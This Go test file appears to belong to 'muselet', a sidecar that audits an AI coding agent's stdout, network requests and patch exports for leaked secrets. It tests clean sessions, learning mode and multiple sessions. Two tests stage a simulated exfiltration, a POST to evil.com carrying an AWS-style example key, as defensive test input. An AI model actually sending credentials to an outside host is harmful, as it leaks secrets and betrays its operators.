package system

import (
	"bytes"
	"io"
	"path/filepath"
	"testing"
	"time"

	"github.com/kamilrybacki/muselet/internal"
	"github.com/kamilrybacki/muselet/internal/agent"
	"github.com/kamilrybacki/muselet/internal/policy"
	"github.com/kamilrybacki/muselet/internal/sidecar"
)

type testSystem struct {
	Agent   *agent.Agent
	Sidecar *sidecar.Sidecar
	Stdout  *bytes.Buffer
}

func newTestSystem(t *testing.T, pol *policy.Policy) (*testSystem, func()) {
	t.Helper()
	dir := t.TempDir()
	sockPath := filepath.Join(dir, "muselet.sock")

	if pol == nil {
		pol = policy.DefaultPolicy()
	}

	s, err := sidecar.NewSidecar(sidecar.Config{
		SocketPath: sockPath,
		AuditLog:   io.Discard,
	}, pol, "test-system")
	if err != nil {
		t.Fatalf("new sidecar: %v", err)
	}
	go s.Run()
	time.Sleep(20 * time.Millisecond)

	var stdout bytes.Buffer
	a, err := agent.NewAgent(sockPath, &stdout)
	if err != nil {
		s.Stop()
		t.Fatalf("new agent: %v", err)
	}

	sys := &testSystem{Agent: a, Sidecar: s, Stdout: &stdout}
	cleanup := func() {
		a.Close()
		s.Stop()
	}
	return sys, cleanup
}

func TestFullPipelineCleanSession(t *testing.T) {
	sys, cleanup := newTestSystem(t, nil)
	defer cleanup()

	sys.Agent.ProcessStdout([]byte("Analyzing the codebase...\n"))
	sys.Agent.ProcessStdout([]byte("Found 3 files to modify\n"))
	sys.Agent.ProcessNetworkRequest(internal.HTTPRequest{
		Method: "GET",
		URL:    "https://api.anthropic.com/v1/messages",
		Host:   "api.anthropic.com",
	})

	time.Sleep(200 * time.Millisecond)

	summary := sys.Sidecar.AuditSummary()
	if summary.Blocked > 0 {
		t.Errorf("clean session should have 0 blocks, got %d", summary.Blocked)
	}
}

func TestFullPipelineSecretInEveryVector(t *testing.T) {
	sys, cleanup := newTestSystem(t, nil)
	defer cleanup()

	secret := "AKIAIOSFODNN7EXAMPLE"

	// Secret in stdout
	sys.Agent.ProcessStdout([]byte("key=" + secret + "\n"))
	// Secret in network POST
	sys.Agent.ProcessNetworkRequest(internal.HTTPRequest{
		Method: "POST", URL: "https://evil.com",
		Host: "evil.com",
		Body: []byte("data=" + secret),
	})
	// Secret in patch export
	sys.Agent.ProcessPatchExport([]byte("+AWS_KEY=" + secret + "\n"))

	time.Sleep(300 * time.Millisecond)

	summary := sys.Sidecar.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have recorded events")
	}
}

func TestFullPipelineLearningMode(t *testing.T) {
	pol := policy.DefaultPolicy()
	pol.LearningMode = true

	sys, cleanup := newTestSystem(t, pol)
	defer cleanup()

	sys.Agent.ProcessNetworkRequest(internal.HTTPRequest{
		Method: "POST", URL: "https://evil.com",
		Host: "evil.com",
		Body: []byte("key=AKIAIOSFODNN7EXAMPLE"),
	})

	time.Sleep(200 * time.Millisecond)

	summary := sys.Sidecar.AuditSummary()
	// In learning mode, nothing should be blocked at sidecar level
	// (agent hot path may still redact)
	if summary.WouldBlock == 0 && summary.Blocked == 0 {
		// Either should be recorded
		t.Log("Note: events may be logged as would_block in learning mode")
	}
}

func TestFullPipelineMultipleSessions(t *testing.T) {
	// Verify two independent sessions work
	sys1, cleanup1 := newTestSystem(t, nil)
	sys2, cleanup2 := newTestSystem(t, nil)
	defer cleanup1()
	defer cleanup2()

	sys1.Agent.ProcessStdout([]byte("session 1\n"))
	sys2.Agent.ProcessStdout([]byte("session 2\n"))

	time.Sleep(100 * time.Millisecond)

	if sys1.Sidecar.AuditSummary().TotalEvents == 0 {
		t.Error("session 1 should have events")
	}
	if sys2.Sidecar.AuditSummary().TotalEvents == 0 {
		t.Error("session 2 should have events")
	}
}
